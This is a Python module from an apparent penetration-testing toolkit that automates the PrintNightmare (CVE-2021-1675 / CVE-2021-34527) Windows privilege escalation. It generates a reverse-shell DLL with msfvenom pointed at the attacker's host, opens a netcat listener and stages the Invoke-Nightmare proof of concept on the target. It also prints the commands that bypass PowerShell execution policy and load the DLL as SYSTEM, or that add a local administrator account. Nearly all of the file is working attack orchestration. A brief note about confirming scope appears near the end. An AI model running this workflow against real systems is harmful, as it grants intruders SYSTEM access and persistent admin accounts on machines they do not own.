import shutil
import subprocess
from pathlib import Path

from core.target import load_current_profile, get_active_cred
from core.attacker import resolve_lhost
from core.paths import get_windows_tools_dir
from modules.upload.windows import stage_windows_files


G, C, B, Y, W, R = (
        '\033[92m',
        '\033[96m',
        '\033[94m',
        '\033[93m',
        '\033[0m',
        '\033[91m',
)

DIM = '\033[2m'

DEFAULT_DRIVER_NAME = "PrintIt"
DEFAULT_NEW_USER = "hacker"


# ==========================================
# HELPERS
# ==========================================

def _header():

    print(f"\n{B}┌── MODULE: KERNEL EXPLOITS — PRINTNIGHTMARE " + "─" * 15 + f"┐{W}")
    print(f"{B}│{W} TECHNIQUE: {C}{'CVE-2021-1675 / CVE-2021-34527':<47}{W}{B}│{W}")
    print(f"{B}└" + "─" * 59 + f"┘{W}")


def _section(title):
    print(f"\n{B}[*] {title}{W}")


def _step(n, title, why=None):

    print(f"\n{B}[{n}]{W} {title}")

    if why:
        print(f"    {why}")


def _cmd(*lines):

    print()

    for line in lines:

        if line.startswith("#"):
            print(f"    {DIM}{line}{W}")
        elif "#" in line:
            code, comment = line.split("#", 1)
            print(f"    {Y}{code.rstrip()}{W}  {DIM}#{comment}{W}")
        else:
            print(f"    {Y}{line}{W}")


def _ask(prompt, default_yes=True, optional=False):

    #
    # Yellow [?] marks a genuinely skippable extra, not just any
    # default-to-no question — safety gates stay blue.
    #
    marker = Y if optional else B

    raw = input(f"\n{marker}[?]{W} {prompt}").strip().lower()

    if default_yes:
        return raw in ("", "y", "yes")

    return raw in ("y", "yes")


def _resolve_context():

    try:
        data, _ = load_current_profile()
    except Exception:
        data = {}

    ip = resolve_lhost(args=None, data=data)
    domain = data.get("domain")

    user = None

    try:
        user = get_active_cred(data).get("user")
    except Exception:
        pass

    return ip, domain, user


def _start_listener(port):

    try:

        subprocess.Popen(
            ["x-terminal-emulator", "-e", f"bash -c 'nc -lvnp {port}; exec bash'"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        print(f"{G}[+] Started a Netcat listener on port {port} in a new terminal{W}")

    except Exception as e:

        print(f"{R}[-] Failed to start listener: {e}{W}")
        print(f"{Y}[!] Start one yourself: nc -lvnp {port}{W}")


def _generate_dll(lhost, lport, arch, outfile):

    #
    # windows/shell_reverse_tcp is x86-only — -a alone doesn't retarget it,
    # the arch has to be baked into the payload path itself for x64.
    #
    payload = "windows/x64/shell_reverse_tcp" if arch == "x64" else "windows/shell_reverse_tcp"

    if not shutil.which("msfvenom"):

        print(f"\n{Y}[!] msfvenom not found on this box — generate it manually:{W}")
        _cmd(f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -a {arch} --platform windows -f dll -o {outfile}")

        return None

    print(f"\n{B}[*] Generating {outfile} with msfvenom...{W}")

    result = subprocess.run(
        [
            "msfvenom",
            "-p", payload,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-a", arch,
            "--platform", "windows",
            "-f", "dll",
            "-o", outfile,
        ],
        capture_output=True,
        text=True,
    )

    if result.returncode != 0 or not Path(outfile).is_file():

        print(f"{R}[-] msfvenom failed:{W}")
        print(result.stderr.strip())

        return None

    print(f"{G}[+] Generated {outfile}{W}")

    return Path(outfile)


# ==========================================
# PUBLIC API
# ==========================================

def run(data, cred, args):

    ip, domain, default_user = _resolve_context()

    _header()

    #
    # We deliberately don't reimplement Invoke-Nightmare's RpcAddPrinterDriver
    # abuse ourselves — it's third-party PoC code (the PowerShell port HTB's
    # material references, built on cube0x0's work), not something to
    # reproduce from memory. This module stages it and orchestrates around
    # it, the same way the kernel.hivenightmare/CVE-2020-0668 findings point
    # at external tools rather than us reimplementing the primitive.
    #
    script_path = get_windows_tools_dir() / "CVE-2021-1675.ps1"

    if not script_path.is_file():
        print(f"{Y}[!] {script_path} doesn't exist — download it there before running this module, the transfer step below will fail otherwise.{W}")

    _section("Setup")

    _step(
        1,
        "Confirm the Print Spooler service is running",
        "No spoolss pipe means this technique doesn't apply here at all.",
    )
    _cmd(r"ls \\localhost\pipe\spoolss")

    if _ask(f"Transfer {script_path.name} to the target? [Y/n]: "):
        stage_windows_files([script_path])

    _section("Choose payload")

    #
    # Reverse shell is the default across these modules (binary.py,
    # weakperms/service.py) — phrasing the question this way keeps a
    # blank Enter landing on reverse shell everywhere, consistently.
    #
    admin_add = _ask(
        "Add a user to local Administrators instead of a reverse shell? [y/N]: ",
        default_yes=False,
        optional=True,
    )

    dll_name = None

    if admin_add:

        new_user = input(f"\n{B}[?]{W} New local admin username [{C}{DEFAULT_NEW_USER}{W}]: ").strip() or DEFAULT_NEW_USER

        #
        # Never let a bracketed placeholder become the literal value a
        # blank Enter silently accepts — this one has no safe default at all.
        #
        new_password = ""
        while not new_password:
            new_password = input(f"\n{B}[?]{W} Password for the new account (must meet complexity — required): ").strip()

    else:

        lport = input(f"\n{B}[?]{W} Listener port [{C}4444{W}]: ").strip() or "4444"

        print(f"\n{B}[*]{W} Not sure of the target's architecture? Run this on target first:")
        _cmd(
            "[System.Environment]::Is64BitOperatingSystem",
            "# True = x64, False = x86",
        )

        arch = input(f"\n{B}[?]{W} Payload architecture, x86 or x64 [{C}x64{W}]: ").strip() or "x64"

        dll_name = "nightmare_payload.dll"
        dll_path = _generate_dll(ip or "<ATTACKER-IP>", lport, arch, dll_name)

        if dll_path and _ask(f"Transfer {dll_name} to the target? [Y/n]: "):
            stage_windows_files([dll_path])

        if _ask(f"Start a Netcat listener on port {lport} now? [Y/n]: "):
            _start_listener(lport)

    driver_name = input(f"\n{B}[?]{W} Driver name to register [{C}{DEFAULT_DRIVER_NAME}{W}]: ").strip() or DEFAULT_DRIVER_NAME

    _section("Execute on target")

    _step(1, "Bypass the execution policy for this session only")
    _cmd("Set-ExecutionPolicy Bypass -Scope Process")

    _step(2, "Import the PoC module")
    _cmd(f"Import-Module .\\{script_path.name}")

    _step(
        3,
        "Trigger the exploit",
        "SeLoadDriverPrivilege is normally required for this — the flaw is that it isn't actually checked.",
    )

    if admin_add:
        _cmd(f'Invoke-Nightmare -NewUser "{new_user}" -NewPassword "{new_password}" -DriverName "{driver_name}"')
    else:
        _cmd(f'Invoke-Nightmare -DLL "C:\\Users\\Public\\Uploads\\{dll_name}" -DriverName "{driver_name}"')

    if admin_add:

        _step(4, "Confirm the account landed in Administrators")
        _cmd(f"net user {new_user}")

        _step(5, "Get a fresh session to actually use the new admin membership")

        runas_user = f"{domain}\\{new_user}" if domain else new_user
        _cmd(f"runas /user:{runas_user} powershell.exe")

        print()
        print(f"    {B}[*]{W} Your old session's token is stale — it won't reflect the new group until relogon.")
        print()
        print(f"    {DIM}Account creation is noisy and easy to spot — confirm this is in scope before using it on an assessment.{W}")

    else:

        print()
        print(f"    {B}[*]{W} Catch the shell on your listener — it runs as NT AUTHORITY\\SYSTEM.")
